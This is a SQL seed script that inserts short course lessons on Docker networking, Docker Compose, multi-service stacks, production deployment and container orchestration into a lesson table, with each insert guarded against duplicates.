INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372', 'Docker Networking', 3, 'Network Types:
bridge, host, overlay, none, macvlan

DNS:
Containers resolve by name

Port Mapping:
-p host:container, -P all ports

Security:
--internal, custom bridges' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372' AND title = 'Docker Networking');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5', 'Docker Compose Fundamentals', 1, 'Structure:
version, services, volumes, networks

Commands:
up -d, down, ps, logs -f, exec, build, pull

Features:
Health checks, volumes, .env files' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5' AND title = 'Docker Compose Fundamentals');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5', 'Multi-Service Architecture', 2, 'Typical Stack:
nginx, frontend, api, db, redis

Dependencies:
depends_on with health checks

Networks:
Frontend net vs backend net' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5' AND title = 'Multi-Service Architecture');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5', 'Production Deployment', 3, 'Checklist:
- Health checks, resource limits, logging
- Secrets, SSL/TLS, backups, monitoring

Secrets:
.env files or Docker secrets

Backup:
pg_dump, volume tar' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5' AND title = 'Production Deployment');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '61a08aeb-28b8-41f8-9c8d-169511f8a50c', 'Container Orchestration Concepts', 1, 'Why Orchestration:
- Automated deployment/scaling
- Self-healing, load balancing
- Rolling updates, service discovery

Kubernetes:
- Control Plane: API server, scheduler, etcd
- Pod: Smallest deployable unit
- Service: Stable network endpoint
- Deployment: Manages replicas

Docker Swarm:
- docker swarm init, stack deploy, service scale' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '61a08aeb-28b8-41f8-9c8d-169511f8a50c' AND title = 'Container Orchestration Concepts');